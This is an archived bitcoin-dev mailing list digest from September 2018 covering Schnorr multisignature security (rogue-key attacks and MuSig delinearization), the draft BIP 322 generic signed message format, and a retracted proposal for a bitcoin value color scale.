URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180911/20ed54de/attachment-0001.html>

From erik at q32.com  Tue Sep 11 17:20:01 2018
From: erik at q32.com (Erik Aronesty)
Date: Tue, 11 Sep 2018 13:20:01 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
Message-ID: <CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>

Greg,

I added, stripped out, and added analogous musig delinearization 3 times in
response to stuff posted here.  I'm adding it back now. Not sure why my
head is thick around that issue.

The security advantages of a redistributable threshold system are huge.
If a system isn't redistributable, then a single lost or compromised key
results in lost coins... meaning the system is essetntially unusable.

I'm actually worried that Bitcoin releases a multisig that encourages loss.




On Tue, Sep 11, 2018 at 1:00 PM Gregory Maxwell <greg at xiph.org> wrote:

> On Tue, Sep 11, 2018 at 4:34 PM Erik Aronesty <erik at q32.com> wrote:
>
>> To answer points:
>>
>> - I switched to the medium article so that I could correct, edit and
>> improve things to make them more clear.
>> - I responded to feedback by modifying the protocol to make it work - not
>> by ignoring it.
>>
>
> To this moment there remains no response at your post.
> https://bitcointalk.org/index.php?topic=4973123.0
>
> I'm not sure how I am supposted to have figured out that you wrote a
> somewhat different repost of it elsewhere...
>
> - An M-1 rogue-key attack would require the attacker would to either
>>
>>   - attack the hash function to produce a predictable R based on a known
>> mesage
>>   - attack the DLP to influence x or k
>>
>> Neither attack gives any particular advantage to someone who has M-1 keys.
>>
>
> You keep asserting this. It isn't true. Asserting it more does not make it
> any more true.  I already explained how to attack this style of signature
> (e.g. in the BCT thread).
>
> Set aside your 'interpolation' for a moment, and imagine that you
> construct a 2 of 2 signature by just adding the keys.  Your tell me your
> key, P1  and then I tell you that my key P2 which I derived by computing
> -P1  + xG.   We now compute P = P1 + P2 = P1 + -P1 + xG = xG ... and now in
> spite adding P1 with an unknown discrete log, I know the discrete log of P
> with respect to G and I did not need to violate the standard DL security
> assumption to achieve that.
>
> With the 'interpolation' in effect the same attack applies but its
> execution is somewhat more complex: instead of adding the negation of P1  I
> must add a number of multiplicities of P1 (like P1*2, P1*3, P1*4...)
> selected so that their interpolation coefficients add up to -1. Finding a
> suitable subset requires solving a randomized modular subset sum problem
> and Wagner's algorithm provides a computationally tractable solution to it.
>
> The potential of rogue keys applies to both the keys themselves and to the
> nonces. There are several ways to prevent these attacks, the musig paper
> describes a delinearization technique which doesn't require additional
> interaction or communication.
>
> I haven't tested whether the R,s version is susceptible though.
>>
>
> There is a perfect bijection between the two encodings which is easily
> computable, so they're the same thing from an abstract security perspective.
>
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180911/1dad3a33/attachment.html>

From erik at q32.com  Tue Sep 11 17:37:59 2018
From: erik at q32.com (Erik Aronesty)
Date: Tue, 11 Sep 2018 13:37:59 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
	<CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
Message-ID: <CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>

- Musig, by being M of M, is inherently prone to loss.

- Having the senders of the G*x pubkey shares sign their messages with the
associated private key share should be sufficient to prevent them from
using wagner's algorithm to attack the combined key.   Likewise, the G*k
nonce fragments should also be signed with the pubkey shares.



On Tue, Sep 11, 2018 at 1:27 PM Gregory Maxwell <greg at xiph.org> wrote:

> On Tue, Sep 11, 2018 at 5:20 PM Erik Aronesty <erik at q32.com> wrote:
> > The security advantages of a redistributable threshold system are huge.
>  If a system isn't redistributable, then a single lost or compromised key
> results in lost coins... meaning the system is essetntially unusable.
> >
> > I'm actually worried that Bitcoin releases a multisig that encourages
> loss.
>
> There is no "non- edistributiable multisig" proposed for Bitcoin
> anywhere that I am aware of.
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180911/d39149db/attachment.html>

From erik at q32.com  Tue Sep 11 18:30:13 2018
From: erik at q32.com (Erik Aronesty)
Date: Tue, 11 Sep 2018 14:30:13 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAAS2fgTRmsws4y7yz=584QXvjsVawY84je=jOEoXm2RK_jieXQ@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
	<CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
	<CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
	<CAAS2fgTRmsws4y7yz=584QXvjsVawY84je=jOEoXm2RK_jieXQ@mail.gmail.com>
Message-ID: <CAJowKgKAEY65Jxd5P6tTfn8gWCg2H2Yzi7C56=PH9Zr0AgdAPw@mail.gmail.com>

>  That approach has its uses but I think that in any case where
delinearization can be used it's a better option.

I agree, communication efficiency is a concern for some applications, and I
can think of cases where delinearization is the better option as well.

For users that want an "M of N" scheme that

a) doesn't cost more to send funds
b) allows them to lose a device and keep their coins
c) allows them to establish and validate the scheme safely

...  a simple, "verified signer" threshold scheme is probably the best
solution.




On Tue, Sep 11, 2018 at 1:51 PM Gregory Maxwell <greg at xiph.org> wrote:

> On Tue, Sep 11, 2018 at 5:38 PM Erik Aronesty <erik at q32.com> wrote:
> >
> > - Musig, by being M of M, is inherently prone to loss.
>
> M of M is a particular threshold.   If you want M of M (there are
> plenty of cases where M of M _must_ be used) then you get the
> consequences of M of M, which presumably you want.
>
> This has nothing to do with musig.  If you want a threshold other than
> M of M then you use a threshold other than M of M.
>
> No one is under the impression that M of M is somehow a replacement
> for other thresholds.  We've spent more time talking about M of M in
> some writeups in the past because it's exactly the case you need for
> signature aggregation in Bitcoin and because it's a simpler case to
> explain.
>
> > - Having the senders of the G*x pubkey shares sign their messages with
> the associated private key share should be sufficient to prevent them from
> using wagner's algorithm to attack the combined key.
>
> Yes, that is one possibility which is described in the musig paper,
> but it requires users communicate an extra signature per key.  So, for
> example, if used with aggregate signature it would completely
> eliminate the communications efficiency gains from aggregation, making
> aggregation worse than pointless.  It also has somewhat worse failure
> properties than delinearization, because a signer that fails to
> validate other's share signatures behaves behaves exactly the same as
> a correct one, on honest inputs.  That approach has its uses but I
> think that in any case where delinearization can be used it's a better
> option.
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180911/28f34718/attachment.html>

From karljohan-alm at garage.co.jp  Tue Sep 11 04:41:57 2018
From: karljohan-alm at garage.co.jp (Karl-Johan Alm)
Date: Tue, 11 Sep 2018 13:41:57 +0900
Subject: [bitcoin-dev] RFC: BIP 322: Generic Signed Message Format
Message-ID: <CALJw2w6m4iJWC_ySt32-oKD_1e4p1UcJqJG1Lm5gZDnrPgEwmQ@mail.gmail.com>

Hi.

[note: BIP number was assigned to PR before this email was sent; I did
not self-assign the BIP number]

Below is a proposal to extend the existing sign/verifymessage format
to a more generalized variant relying on the script verification
mechanism in Bitcoin itself for message signing/verification, based on
the original discussion
(https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-March/015818.html)
.

PR is here: https://github.com/bitcoin/bips/pull/725

A formatted version of this text can be seen here:
https://github.com/kallewoof/bips/blob/bip-generic-signmessage/bip-generic-signmessage.mediawiki

Note: I am not sure how to best deal with CLTV/CSV stuff here, ultimately.

Note 2: I have received suggestions from several people to use a
Bitcoin transaction instead. If someone could explain why this is
beneficial, it would be very helpful. I'm not against it, just feels
like the whole transaction part is unnecessary complexity/overhead.

---
<pre>
  BIP: 322
  Layer: Applications
  Title: Generic Signed Message Format
  Author: Karl-Johan Alm <karljohan-alm at garage.co.jp>
  Comments-Summary: No comments yet.
  Comments-URI: https://github.com/bitcoin/bips/wiki/Comments:BIP-0322
  Status: Draft
  Type: Standards Track
  Created: 2018-09-10
  License: CC0-1.0
</pre>

== Abstract ==

A standard for interoperable generic signed messages based on the
Bitcoin Script format.

== Motivation ==

The current message signing standard only works for P2PKH (1...)
addresses. By extending it to use a Bitcoin Script based approach, it
could be made more generic without causing a too big burden on
implementers, who most likely have access to Bitcoin Script
interpreters already.

== Specification ==

A new structure <code>SignatureProof</code> is added, which is a
simple serializable scriptSig & witnessProgram container.

Two actions "Sign" and "Verify" are defined.

=== SignatureProof container ===

{|class="wikitable" style="text-align: center;"
|-
!Type
!Length
!Name
!Comment
|-
|Uint32||4||flags||standard flags (1-to-1 with standard flags in Bitcoin Core)
|-
|VarInt||1-8||msglen||Number of bytes in message string, excluding NUL
termination
|-
|Char*||[msglen]||msg||The message being signed for all subjects,
excluding NUL termination
|-
|Uint8||1||entries||Number of proof entries<ref><strong>Why support
multiple proofs?</strong> In particular with proof of funds, it is
non-trivial to check a large number of individual proofs (one per
UTXO) for duplicates. Software could be written to do so, but it seems
more efficient to build this check into the specification
itself.</ref>
|}

The above is followed by [entries] number of signature entries:

{|class="wikitable" style="text-align: center;"
|-
!Type
!Length
!Name
!Comment
|-
|VarInt||1-8||scriptsiglen||Number of bytes in scriptSig data
|-
|Uint8*||[scriptsiglen]||scriptsig||ScriptSig data
|-
|VarInt||1-8||witlen||Number of bytes in witness program data
|-
|Uint8*||[witlen]||wit||Witness program
|}

In some cases, the scriptsig may be empty (scriptsiglen=0).

=== Signing ===

The "Sign" action takes as input a scriptPubKey and a message (e.g.
"hello world"). It succeeds or fails.

# FAIL if scriptPubKey already exists in scriptPubKeys set, otherwise
insert it<ref><strong>Why track duplicates?</strong> Because a 3-entry
proof is not proving 3 scriptPubKeys unless they are all distinct, or
unless they are proving different UTXO:s (see Future Extensions)</ref>
# Derive the private key privkey for the scriptPubKey, or FAIL
# Define the message pre-image as the sequence "Bitcoin Message:"
concatenated with the message, encoded in UTF-8 using Normalization
Form Compatibility Decomposition (NFKD)
# Let sighash = sha256(sha256(scriptPubKey || pre-image))
# Generate a signature sig with privkey=privkey, sighash=sighash

Repeat the above operation for each scriptPubKey, retaining the
scriptPubKeys set. As noted, if the same scriptPubKey appears more
than once, the sign operation must fail.

=== Verifying ===

The "Verify" action takes as input a standard flags value, a
scriptPubKey, a message, a script sig, and a witness program.
It emits one of INCONCLUSIVE, VALID, INVALID, or ERROR.

# Return ERROR if scriptPubKey already exists in scriptPubKeys set,
otherwise insert it
# If one or more of the standard flags are unknown, return INCONCLUSIVE
# Define the message pre-image as the sequence "Bitcoin Message:"
concatenated with the message, encoded in UTF-8 using Normalization
Form Compatibility Decomposition (NFKD).
# Let sighash = sha256(sha256(scriptPubKey || pre-image))
# Verify Script with flags=standard flags, scriptSig=script sig,
scriptPubKey=scriptPubKey, witness=witness program, and
sighash=sighash
# Return VALID if verify succeeds, otherwise return INVALID

Repeat the above operation for each scriptPubKey, retaining the
scriptPubKeys set. As noted, if the same scriptPubKey appears more
than once, the verify operation must fail with an ERROR.

* If a verification call returns ERROR or INVALID, return ERROR or
INVALID immediately, ignoring as yet unverified entries.
* After all verifications complete, return INCONCLUSIVE if any
verification call returned INCONCLUSIVE.
* Return VALID if and only if every verification returned VALID.

== Future Extensions ==

=== Proof of Funds ===

The specification can be extended to handle proof of funds in the
following manner:

* Let the message be prefixed with "POF:", followed by a
newline-terminated string<ref><strong>Why not just the UTXO
data?</strong> We want the verifier to be able to challenge the prover
with a custom message to sign, or anyone can reuse the POF proof for a
set of UTXO:s once they have seen it, and the funds have not yet been
spent</ref>, followed by [entries] series of hex-encoded transaction
ID:vout pairs, separated by a single space (" ") character
* Fail if the number of txid:vout pairs is not exactly equal to [entries]
* Retain the message as is for all sighash operations (i.e. all sign
and verify operations should sign and verify the entire list of
UTXO:s)<ref><strong>Why use same sighash?</strong> The prover is
proving that they have a set of UTXO:s at their disposal. Taking a
sub-set of the proofs and turning them into a new proof should not be
valid.</ref>
* Add a verification that the txid/vout is a valid UTXO according to a
synced up Bitcoin node, and that its corresponding scriptPubKey
matches the one given by the proof. Return ERROR if scriptPubKey
mismatch, and SPENT error if spent
* Extend the scriptPubKeys set check to only fail if the same
scriptPubKey and proof-of-funds txid/vout combination is encountered

== Compatibility ==

This specification is not backwards compatible with the legacy
signmessage/verifymessage specification. However, legacy addresses
(1...) may be used in this implementation without any problems.

== Rationale ==

<references/>

== Reference implementation ==

To do.

== Acknowledgements ==

TODO

== References ==

# Original mailing list thread:
https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-March/015818.html

== Copyright ==

This document is licensed under the Creative Commons CC0 1.0 Universal license.
---

-Kalle.

From nakagat at gmail.com  Wed Sep 12 06:00:17 2018
From: nakagat at gmail.com (nakagat)
Date: Wed, 12 Sep 2018 15:00:17 +0900
Subject: [bitcoin-dev] Multisignature for bip-schnorr
In-Reply-To: <80e4e9b8-0cf3-b99e-7ac3-87ebbd8bb97c@gmail.com>
References: <CAHk9a9ct_h485MY4gk7S++FAu5FEH3PL9pd9mrrh+wA8nWaVUA@mail.gmail.com>
	<80e4e9b8-0cf3-b99e-7ac3-87ebbd8bb97c@gmail.com>
Message-ID: <CAHk9a9dEu9y1-trZLyTwd3vWrwrUt2SOB=zi4covG6XkOy7ZbA@mail.gmail.com>

Hi Jonas

Thank you for your comment.

I wrote a new text.
https://gist.github.com/tnakagawa/e6cec9a89f698997dc58a09db541e1eb

If you have time, please review this.
2018?9?7?(?) 17:09 Jonas Nick <jonasdnick at gmail.com>:
>
> Your multisignature writeup appears to be vulnerable to key cancellation
> attacks because the aggregated public key is just the sum of public keys (and
> there is no proof of knowledge of the individual secret keys). Therefore, in a
> multisignature between Alice and an attacker, the attacker can choose their key
> to be -alice_key+attacker_key resulting in an aggregated key for which the
> attacker can sign alone (without requiring Alice's partial signature). The
> Schnorr BIP links to the MuSig paper which describes a secure key aggregation
> scheme. See https://eprint.iacr.org/2018/068
>
> On 8/7/18 6:35 AM, nakagat via bitcoin-dev wrote:
> > Hi all,
> >
> > I wrote a multisignature procedure using bip-schnorr.
> >
> > If you have time to review and give feedback, I?d really appreciate it.
> > Thanks in advance!
> >
> > Multisignature
> > https://gist.github.com/tnakagawa/0c3bc74a9a44bd26af9b9248dfbe598b
> >
> > Original
> > https://github.com/sipa/bips/blob/bip-schnorr/bip-schnorr.mediawiki#Multisignatures_and_Threshold_Signatures
> >

From karljohan-alm at garage.co.jp  Wed Sep 12 06:13:56 2018
From: karljohan-alm at garage.co.jp (Karl-Johan Alm)
Date: Wed, 12 Sep 2018 15:13:56 +0900
Subject: [bitcoin-dev] Suggestion for a universal bitcoin value scale
In-Reply-To: <5b787d19.1c69fb81.e0628.771a@mx.google.com>
References: <5b787d19.1c69fb81.e0628.771a@mx.google.com>
Message-ID: <CALJw2w7GZ=MXO8jMdObznqB8RndUjLOSRW-dFcQPsFLXeGsyLQ@mail.gmail.com>

A potential problem is that it would be a new attack vector to simply
color something to appear as e.g. 10x more than it really is, if
everyone started using this system.
On Sun, Aug 19, 2018 at 5:27 AM Martin Damgaard via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
>
> Hi bitcoin-dev at lists.linuxfoundation.org
>
> Here is my humble attempt to make a contribution to the impressive work that you all are doing.
>
> I am unfamiliar with the normal BIP procedures. I have therefore just tried to follow the example of BIP 176 by Jimmy Song, in order make something similar. I suggest a universal bitcoin value color scale, for tackling the same decimal problem, as identified by the BIP 176 proposal.
>
> I have attached the document in three different formats (*.rtf, *.pdf and *.docx) as I do not know your preferred format. I hope you will find my suggestion useful.
>
>
>
> Thank you and all the best
>
> Martin Damgaard
>
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev

From karljohan-alm at garage.co.jp  Wed Sep 12 07:56:25 2018
From: karljohan-alm at garage.co.jp (Karl-Johan Alm)
Date: Wed, 12 Sep 2018 16:56:25 +0900
Subject: [bitcoin-dev] RFC: BIP 322: Generic Signed Message Format
In-Reply-To: <CALJw2w6m4iJWC_ySt32-oKD_1e4p1UcJqJG1Lm5gZDnrPgEwmQ@mail.gmail.com>
References: <CALJw2w6m4iJWC_ySt32-oKD_1e4p1UcJqJG1Lm5gZDnrPgEwmQ@mail.gmail.com>
Message-ID: <CALJw2w7w9DvOcnx8DZS6T4cDiBRxPBuFwjxnstg3BL11KMn_eg@mail.gmail.com>

Greetings,

(The quoted proposal is already outdated, and I recommend you check
out the up to date formatted version here:
https://github.com/kallewoof/bips/blob/bip-generic-signmessage/bip-0322.mediawiki
The PR with comments is here: https://github.com/bitcoin/bips/pull/725)

A big part of the feedback boils down to conflicts of opinion related
to whether or not proofs should be given as transactions or not.

I am attempting to write down the pros and cons below, some of which
are contradictory/complementary based on multiple people's opinions.

Pros of using transaction format:
1. works out of the box with existing HSM:s, some of which may be
purposefully built to not be upgradable for security reasons (unless
sighash modified; see below)
2. easier to incorporate into existing software
3. forward compatible with bitcoin extensions (e.g. mimblewimble,
confidential transactions, etc)
4. HSM:s *should* be blind to whether or not a transaction or a
message or proof of funds is being signed (see Con #3)

Cons:
1. dangerous if challenger is able to convince prover to sign a
message that corresponds to an actual transaction; modifying sighash
is suggested, but defeats pro #1 above; can define in tx to have txin
as sighash to guarantee invalid on chain
2. unupgraded software are unable to make distinction between message
sign and transaction sign
3. if HSM:s do not support it and do not support upgrading, this is by
design, and message signing should be explicitly supported or not be
possible (see Pro #4)
4. severely cripples UX for hardware wallets that actually show the
contents of the transaction during the signing

If anyone has comments on this, it would be tremendously appreciated.

There is also a divided opinion on whether an "OP_MESSAGEONLY" opcode
should be introduced, but I'd like to address the above first, if
possible.
On Tue, Sep 11, 2018 at 1:41 PM Karl-Johan Alm
<karljohan-alm at garage.co.jp> wrote:
>
> Hi.
>
> [note: BIP number was assigned to PR before this email was sent; I did
> not self-assign the BIP number]
>
> Below is a proposal to extend the existing sign/verifymessage format
> to a more generalized variant relying on the script verification
> mechanism in Bitcoin itself for message signing/verification, based on
> the original discussion
> (https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-March/015818.html)
> .
>
> PR is here: https://github.com/bitcoin/bips/pull/725
>
> A formatted version of this text can be seen here:
> https://github.com/kallewoof/bips/blob/bip-generic-signmessage/bip-generic-signmessage.mediawiki
>
> Note: I am not sure how to best deal with CLTV/CSV stuff here, ultimately.
>
> Note 2: I have received suggestions from several people to use a
> Bitcoin transaction instead. If someone could explain why this is
> beneficial, it would be very helpful. I'm not against it, just feels
> like the whole transaction part is unnecessary complexity/overhead.
>
> ---
> <pre>
>   BIP: 322
>   Layer: Applications
>   Title: Generic Signed Message Format
>   Author: Karl-Johan Alm <karljohan-alm at garage.co.jp>
>   Comments-Summary: No comments yet.
>   Comments-URI: https://github.com/bitcoin/bips/wiki/Comments:BIP-0322
>   Status: Draft
>   Type: Standards Track
>   Created: 2018-09-10
>   License: CC0-1.0
> </pre>
>
> == Abstract ==
>
> A standard for interoperable generic signed messages based on the
> Bitcoin Script format.
>
> == Motivation ==
>
> The current message signing standard only works for P2PKH (1...)
> addresses. By extending it to use a Bitcoin Script based approach, it
> could be made more generic without causing a too big burden on
> implementers, who most likely have access to Bitcoin Script
> interpreters already.
>
> == Specification ==
>
> A new structure <code>SignatureProof</code> is added, which is a
> simple serializable scriptSig & witnessProgram container.
>
> Two actions "Sign" and "Verify" are defined.
>
> === SignatureProof container ===
>
> {|class="wikitable" style="text-align: center;"
> |-
> !Type
> !Length
> !Name
> !Comment
> |-
> |Uint32||4||flags||standard flags (1-to-1 with standard flags in Bitcoin Core)
> |-
> |VarInt||1-8||msglen||Number of bytes in message string, excluding NUL
> termination
> |-
> |Char*||[msglen]||msg||The message being signed for all subjects,
> excluding NUL termination
> |-
> |Uint8||1||entries||Number of proof entries<ref><strong>Why support
> multiple proofs?</strong> In particular with proof of funds, it is
> non-trivial to check a large number of individual proofs (one per
> UTXO) for duplicates. Software could be written to do so, but it seems
> more efficient to build this check into the specification
> itself.</ref>
> |}
>
> The above is followed by [entries] number of signature entries:
>
> {|class="wikitable" style="text-align: center;"
> |-
> !Type
> !Length
> !Name
> !Comment
> |-
> |VarInt||1-8||scriptsiglen||Number of bytes in scriptSig data
> |-
> |Uint8*||[scriptsiglen]||scriptsig||ScriptSig data
> |-
> |VarInt||1-8||witlen||Number of bytes in witness program data
> |-
> |Uint8*||[witlen]||wit||Witness program
> |}
>
> In some cases, the scriptsig may be empty (scriptsiglen=0).
>
> === Signing ===
>
> The "Sign" action takes as input a scriptPubKey and a message (e.g.
> "hello world"). It succeeds or fails.
>
> # FAIL if scriptPubKey already exists in scriptPubKeys set, otherwise
> insert it<ref><strong>Why track duplicates?</strong> Because a 3-entry
> proof is not proving 3 scriptPubKeys unless they are all distinct, or
> unless they are proving different UTXO:s (see Future Extensions)</ref>
> # Derive the private key privkey for the scriptPubKey, or FAIL
> # Define the message pre-image as the sequence "Bitcoin Message:"
> concatenated with the message, encoded in UTF-8 using Normalization
> Form Compatibility Decomposition (NFKD)
> # Let sighash = sha256(sha256(scriptPubKey || pre-image))
> # Generate a signature sig with privkey=privkey, sighash=sighash
>
> Repeat the above operation for each scriptPubKey, retaining the
> scriptPubKeys set. As noted, if the same scriptPubKey appears more
> than once, the sign operation must fail.
>
> === Verifying ===
>
> The "Verify" action takes as input a standard flags value, a
> scriptPubKey, a message, a script sig, and a witness program.
> It emits one of INCONCLUSIVE, VALID, INVALID, or ERROR.
>
> # Return ERROR if scriptPubKey already exists in scriptPubKeys set,
> otherwise insert it
> # If one or more of the standard flags are unknown, return INCONCLUSIVE
> # Define the message pre-image as the sequence "Bitcoin Message:"
> concatenated with the message, encoded in UTF-8 using Normalization
> Form Compatibility Decomposition (NFKD).
> # Let sighash = sha256(sha256(scriptPubKey || pre-image))
> # Verify Script with flags=standard flags, scriptSig=script sig,
> scriptPubKey=scriptPubKey, witness=witness program, and
> sighash=sighash
> # Return VALID if verify succeeds, otherwise return INVALID
>
> Repeat the above operation for each scriptPubKey, retaining the
> scriptPubKeys set. As noted, if the same scriptPubKey appears more
> than once, the verify operation must fail with an ERROR.
>
> * If a verification call returns ERROR or INVALID, return ERROR or
> INVALID immediately, ignoring as yet unverified entries.
> * After all verifications complete, return INCONCLUSIVE if any
> verification call returned INCONCLUSIVE.
> * Return VALID if and only if every verification returned VALID.
>
> == Future Extensions ==
>
> === Proof of Funds ===
>
> The specification can be extended to handle proof of funds in the
> following manner:
>
> * Let the message be prefixed with "POF:", followed by a
> newline-terminated string<ref><strong>Why not just the UTXO
> data?</strong> We want the verifier to be able to challenge the prover
> with a custom message to sign, or anyone can reuse the POF proof for a
> set of UTXO:s once they have seen it, and the funds have not yet been
> spent</ref>, followed by [entries] series of hex-encoded transaction
> ID:vout pairs, separated by a single space (" ") character
> * Fail if the number of txid:vout pairs is not exactly equal to [entries]
> * Retain the message as is for all sighash operations (i.e. all sign
> and verify operations should sign and verify the entire list of
> UTXO:s)<ref><strong>Why use same sighash?</strong> The prover is
> proving that they have a set of UTXO:s at their disposal. Taking a
> sub-set of the proofs and turning them into a new proof should not be
> valid.</ref>
> * Add a verification that the txid/vout is a valid UTXO according to a
> synced up Bitcoin node, and that its corresponding scriptPubKey
> matches the one given by the proof. Return ERROR if scriptPubKey
> mismatch, and SPENT error if spent
> * Extend the scriptPubKeys set check to only fail if the same
> scriptPubKey and proof-of-funds txid/vout combination is encountered
>
> == Compatibility ==
>
> This specification is not backwards compatible with the legacy
> signmessage/verifymessage specification. However, legacy addresses
> (1...) may be used in this implementation without any problems.
>
> == Rationale ==
>
> <references/>
>
> == Reference implementation ==
>
> To do.
>
> == Acknowledgements ==
>
> TODO
>
> == References ==
>
> # Original mailing list thread:
> https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-March/015818.html
>
> == Copyright ==
>
> This document is licensed under the Creative Commons CC0 1.0 Universal license.
> ---
>
> -Kalle.

From clark at clarkmoody.com  Wed Sep 12 14:54:15 2018
From: clark at clarkmoody.com (Clark Moody)
Date: Wed, 12 Sep 2018 09:54:15 -0500
Subject: [bitcoin-dev] Suggestion for a universal bitcoin value scale
In-Reply-To: <5b98b2e7.1c69fb81.2a827.102b@mx.google.com>
References: <5b787d19.1c69fb81.e0628.771a@mx.google.com>
	<CALJw2w7GZ=MXO8jMdObznqB8RndUjLOSRW-dFcQPsFLXeGsyLQ@mail.gmail.com>
	<5b98b2e7.1c69fb81.2a827.102b@mx.google.com>
Message-ID: <CAHGSxGuZyZYH-v8ZtjGNJX_2jiEAcpXe2i6OWw2CiJWpnNJdzg@mail.gmail.com>

This is the sort of thing I expect to emerge from the places that use
Bitcoin "on the street." We should be watching how local wallet software
displays bitcoin amounts, letting the standards write themselves over time.
The units debate (bits, millibits, etc) has been going on nearly as long as
I've known about Bitcoin and yet most tools display standard bitcoin
amounts (1 unit = 1e8 satoshi).


-Clark


On Wed, Sep 12, 2018 at 8:41 AM Martin Damgaard via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> A very good point. I have realized the immature nature of my suggestion
> due to this and a number of other good remarks, and will like to retract
> the initial suggestion.
>
> Thank you and all the best
>
> Martin Damgaard
>
>
>
> *Fra: *Karl-Johan Alm <karljohan-alm at garage.co.jp>
> *Sendt: *12. september 2018 08:14
> *Til: *damgaard.martin at gmail.com; Bitcoin Protocol Discussion
> <bitcoin-dev at lists.linuxfoundation.org>
> *Emne: *Re: [bitcoin-dev] Suggestion for a universal bitcoin value scale
>
>
>
> A potential problem is that it would be a new attack vector to simply
>
> color something to appear as e.g. 10x more than it really is, if
>
> everyone started using this system.
>
> On Sun, Aug 19, 2018 at 5:27 AM Martin Damgaard via bitcoin-dev
>
> <bitcoin-dev at lists.linuxfoundation.org> wrote:
>
> >
>
> > Hi bitcoin-dev at lists.linuxfoundation.org
>
> >
>
> > Here is my humble attempt to make a contribution to the impressive work
> that you all are doing.
>
> >
>
> > I am unfamiliar with the normal BIP procedures. I have therefore just
> tried to follow the example of BIP 176 by Jimmy Song, in order make
> something similar. I suggest a universal bitcoin value color scale, for
> tackling the same decimal problem, as identified by the BIP 176 proposal.
>
> >
>
> > I have attached the document in three different formats (*.rtf, *.pdf
> and *.docx) as I do not know your preferred format. I hope you will find my
> suggestion useful.
>
> >
>
> >
>
> >
>
> > Thank you and all the best
>
> >
>
> > Martin Damgaard
>
> >
>
> > _______________________________________________
>
> > bitcoin-dev mailing list
>
> > bitcoin-dev at lists.linuxfoundation.org
>
